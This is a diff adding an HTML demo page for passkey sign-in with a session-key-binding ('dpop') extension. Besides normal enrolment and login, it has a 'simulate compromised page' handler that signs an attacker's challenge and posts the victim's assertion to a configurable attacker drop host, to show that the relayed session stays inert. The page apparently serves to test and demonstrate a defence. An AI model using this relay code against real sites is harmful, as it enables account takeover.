@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Acme Workspace (dpop-ext)</title>
+<style>
+  :root { --bg:#f6f7f9; --card:#fff; --ink:#0d1117; --muted:#667085; --line:#e4e7ec; --brand:#0a7c42; }
+  * { box-sizing: border-box; }
+  body { margin:0; background:var(--bg); color:var(--ink); font:15px/1.55 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; display:grid; place-items:center; min-height:100vh; }
+  .card { width:min(400px,92vw); background:var(--card); border:1px solid var(--line); border-radius:16px; padding:34px 30px; box-shadow:0 10px 30px rgba(16,24,40,.06); }
+  .brand { display:flex; align-items:center; gap:10px; font-weight:700; font-size:18px; margin-bottom:22px; }
+  .logo { width:30px; height:30px; border-radius:8px; background:linear-gradient(135deg,var(--brand),#12b886); }
+  h1 { font-size:20px; margin:0 0 4px; }
+  p.sub { margin:0 0 24px; color:var(--muted); }
+  button { width:100%; padding:13px; border:0; border-radius:10px; background:var(--brand); color:#fff; font:inherit; font-weight:600; cursor:pointer; }
+  button:disabled { opacity:.55; cursor:default; }
+  .status { margin-top:16px; min-height:22px; color:var(--muted); font-size:14px; }
+  .ok { color:#0a7c42; font-weight:600; }
+  .home { display:none; text-align:center; padding:12px 0; }
+  .home .big { font-size:24px; font-weight:700; margin:6px 0; }
+  .avatar { width:64px; height:64px; border-radius:50%; background:linear-gradient(135deg,var(--brand),#12b886); display:grid; place-items:center; color:#fff; font-weight:700; font-size:26px; margin:0 auto 10px; }
+  .pill { font-family:ui-monospace,Menlo,Consolas,monospace; font-size:11px; color:var(--muted); word-break:break-all; margin-top:8px; }
+  details { margin-top:22px; border-top:1px solid var(--line); padding-top:14px; }
+  details summary { cursor:pointer; color:var(--muted); font-size:13px; list-style:none; }
+  details summary::-webkit-details-marker { display:none; }
+  details input { width:100%; padding:9px; border:1px solid var(--line); border-radius:8px; font:inherit; margin:8px 0 0; }
+  details button { background:#fff; color:var(--ink); border:1px solid var(--line); margin-top:12px; }
+  .evil { background:#fff; color:#b42318; border:1px solid #f1c7c2; margin-top:10px; }
+  .foot { margin-top:22px; color:#98a2b3; font-size:12px; text-align:center; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="brand"><div class="logo"></div> Acme Workspace <span style="font-weight:500;color:var(--muted);font-size:13px">· dpop-ext</span></div>
+
+  <div id="login">
+    <h1>Sign in</h1>
+    <p class="sub">Passkey with the <b>dpop</b> extension: the authenticator mints and names a per-session key.</p>
+    <button id="go">Sign in with passkey</button>
+    <button id="evil" class="evil" title="Models an XSS'd page relaying your signature to the attacker">Simulate compromised page (relay my sign-in)</button>
+    <div id="status" class="status"></div>
+
+    <details id="setup">
+      <summary>First time here? Create an account</summary>
+      <input id="username" placeholder="Username" autocomplete="off" />
+      <button id="enroll">Create account and add passkey</button>
+      <div id="setupStatus" class="status"></div>
+    </details>
+  </div>
+
+  <div id="home" class="home">
+    <div class="avatar" id="hinit">?</div>
+    <div>Signed in <span class="ok">&#10003;</span> (dpop-bound)</div>
+    <div class="big" id="hname">Welcome</div>
+    <div class="pill" id="hjkt"></div>
+  </div>
+
+  <div class="foot">Authenticator-held per-session key &middot; named in signed authenticatorData</div>
+</div>
+
+<script type="module">
+import { PasskeyProvider } from '/passkey-provider.js';
+const q = new URLSearchParams(location.search);
+const provider = new PasskeyProvider({ authOrigin: q.get('auth') || 'http://localhost:1525' });
+const $ = (id) => document.getElementById(id);
+const DROP = q.get('drop') || 'http://127.0.0.1:1523';
+const post = (u, body) => fetch(u, { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(body||{}) });
+
+$('enroll').onclick = async () => {
+  const username = $('username').value.trim();
+  if (!username) { $('setupStatus').textContent = 'Enter a username.'; return; }
+  $('enroll').disabled = true; $('setupStatus').textContent = 'Creating account…';
+  try {
+    const begin = await (await post('/register/begin', { username })).json();
+    const reg = await provider.register(username);
+    const fin = await (await post('/register/finish', { userId: begin.publicKey.user.id, credId: reg.credId, publicKey: reg.publicKey, passkeyToken: begin.passkeyToken })).json();
+    if (!fin.ok) throw new Error(fin.error || 'register failed');
+    $('setupStatus').innerHTML = 'Passkey added <span class="ok">&#10003;</span> Now click <b>Sign in with passkey</b>.';
+  } catch (e) { $('setupStatus').textContent = 'Setup failed: ' + (e.message || e); $('enroll').disabled = false; }
+};
+
+$('go').onclick = async () => {
+  $('go').disabled = true; $('status').textContent = 'Signing in…';
+  try {
+    const begin = await (await post('/login/begin', {})).json();
+    const { assertion, handle } = await provider.login(begin.publicKey.challenge);
+    const fin = await (await post('/login/finish', { assertion, passkeyToken: begin.passkeyToken })).json();
+    if (!fin.ok) throw new Error(fin.error || 'login failed');
+    // Exercise the token: /api/me needs a proof signed by the authenticator-held session key.
+    const htu = location.origin + '/api/me';
+    const { nonce } = await (await post('/api/pop-challenge', {})).json();
+    const proof = await provider.prove(handle, 'GET', htu, nonce);
+    const hdr = btoa(unescape(encodeURIComponent(JSON.stringify(proof)))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+    const me = await (await fetch(htu, { headers: { authorization: 'Passkey ' + fin.token, 'x-passkey-proof': hdr } })).json();
+    $('hinit').textContent = (String(me.displayName||'?').trim()[0] || '?').toUpperCase();
+    $('hname').textContent = 'Welcome, ' + (me.displayName || me.username || 'you');
+    $('hjkt').textContent = 'bound jkt (SK): ' + me.jkt;
+    $('login').style.display = 'none'; $('home').style.display = 'block';
+  } catch (e) { $('status').textContent = 'Sign-in failed: ' + (e.message || e); $('go').disabled = false; }
+};
+
+// Compromised page: sign the attacker's challenge and drop the assertion. There is no page-held
+// key to leak, and the assertion names the VICTIM's authenticator-held SK, so the attacker can't
+// swap in its own and can't produce proofs.
+$('evil').onclick = async () => {
+  $('evil').disabled = true; $('status').textContent = 'Relaying sign-in to attacker…';
+  try {
+    const off = await (await fetch(DROP + '/x/offer')).json();
+    if (!off.publicKey || !off.publicKey.challenge) { $('status').textContent = 'No attacker offer waiting. Open the attacker tab first.'; $('evil').disabled = false; return; }
+    const { assertion } = await provider.login(off.publicKey.challenge);
+    await post(DROP + '/x/assertion', { assertion });
+    $('status').innerHTML = 'Signature relayed. Watch the attacker tab: the login completes but the session is <b>inert</b>.';
+    $('evil').disabled = false;
+  } catch (e) { $('status').textContent = 'Relay failed: ' + (e.message || e); $('evil').disabled = false; }
+};
+</script>
+</body>
+</html>
